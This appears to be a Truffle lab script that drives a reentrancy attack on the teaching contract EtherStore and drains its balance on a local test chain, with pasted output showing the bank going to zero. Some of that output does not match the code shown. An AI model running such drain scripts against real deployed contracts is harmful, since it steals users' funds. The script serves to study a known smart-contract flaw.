const Attack = artifacts.require("Attack");
const EtherStore = artifacts.require("EtherStore");

module.exports = async (callback) => {

    var accounts = await web3.eth.getAccounts()
    var attackInst = await Attack.deployed();
    var bankStore = await EtherStore.deployed();
    
    try {
        var deposit1 = await bankStore.deposit(
            {
                from: accounts[3], 
                value: web3.utils.toWei('0', 'ether')
            }
        )
        // console.log(deposit1)
        
        var deposit2 = await bankStore.deposit(
            {
                from: accounts[4], 
                value: web3.utils.toWei('0', 'ether')
            }
        )
    } catch (err){
        console.log("Error")
        console.log(err)
    }
    
    // console.log(deposit2)
    
    var etherStoreBalance = await bankStore.getBalance()
    console.log(`Ether Store Balance : ${etherStoreBalance.toString()}`)

    var attackerBalance = await attackInst.getBalance()
    console.log(`Attacker Balance : ${attackerBalance.toString()}`)
    
    try {
        var attackDeploy = await attackInst.attack(
            {
                from: accounts[2], 
                value: web3.utils.toWei('0', 'ether')
            }
        )
        console.log(attackDeploy.tx)
    } catch (err){
        console.log("Attack Error !!")
        console.log(err)
    }
    
    var attackerBalance = await attackInst.getBalance()
    console.log(`Attacker Balance : ${attackerBalance.toString()}`)
    
    console.log("Lets try to withdraw !"); 
    
    var bankBalance = await bankStore.getBalance();
    console.log(`Bank Store Balance : ${bankBalance.toString()}`)

    
    bankStore.withdraw({from: accounts[3]}).then(() => {
        console.log("Withdrawn");
    }).catch(function(err) {
        console.log("Error : No Withdrawl Possible !")
        // console.log(err);
    })

    bankStore.withdraw({from: accounts[4]}).then(() => {
        console.log("Withdrawn");
    }).catch(function(err) {
        console.log("Error : No Withdrawl Possible !")
        // console.log(err);
    })
    
    try {
        var depleteAllContractBalance = await attackInst.transferToaddress(accounts[2]);
        console.log(depleteAllContractBalance.tx)
    } catch (err){
        console.log("Error")
        console.log(err)
    }
    
    var attackerBalance = await attackInst.getBalance()
    console.log(`Attacker Balance (final) : ${attackerBalance.toString()}`)
}

        // Ether Store Balance : 10000000000000000000
        // Attacker Balance : 0
        // Attacker Attacks !! ->
        // {
        //   tx: '0x62582a4abc1ee77dc746bd3863e3ae2be7b6a7f4fdf5cfe8e3647cc91c254c70',
        //   receipt: {
        //     transactionHash: '0x62582a4abc1ee77dc746bd3863e3ae2be7b6a7f4fdf5cfe8e3647cc91c254c70',
        //     transactionIndex: 0,
        //     blockHash: '0x2efe01f2716389c808bd52841870f1f8a2b5edcc37e9f7e8904341066a652666',
        //     blockNumber: 104,
        //     from: '0x567c940a56138cda857a5549127bae7995387dd8',
        //     to: '0xfad837a5b6032546f91ae56a17f2cc3fdb46abaf',
        //     gasUsed: 182855,
        //     cumulativeGasUsed: 182855,
        //     contractAddress: null,
        //     logs: [],
        //     status: true,
        //     rawLogs: []
        //   },
        //   logs: []
        // }
        // Attacker Balance : 11000000000000000000
        // Lets try to withdraw !
        // Bank Store Balance : 0
        // No Withdrawl Possible !
        // No Withdrawl Possible !
        // Attacker Withdraws all contract ether to him/helself. !! ->
        // {
        //   tx: '0xd5378aaa6bee05c22d3d76069af3552048dcc513d900f2d53d5da6ffc549221f',
        //   receipt: {
        //     transactionHash: '0xd5378aaa6bee05c22d3d76069af3552048dcc513d900f2d53d5da6ffc549221f',
        //     transactionIndex: 0,
        //     blockHash: '0x1799049436d395744360faa09c9f1faeba06643f9211e23081b9ba59acd289df',
        //     blockNumber: 107,
        //     from: '0xb39f1a3aa5d7d3de3b49be8c5ca404a8197a6157',
        //     to: '0xfad837a5b6032546f91ae56a17f2cc3fdb46abaf',
        //     gasUsed: 29369,
        //     cumulativeGasUsed: 29369,
        //     contractAddress: null,
        //     logs: [],
        //     status: true,
        //     rawLogs: []
        //   },
        //   logs: []
        // }
        // Attacker Balance (final) : 0
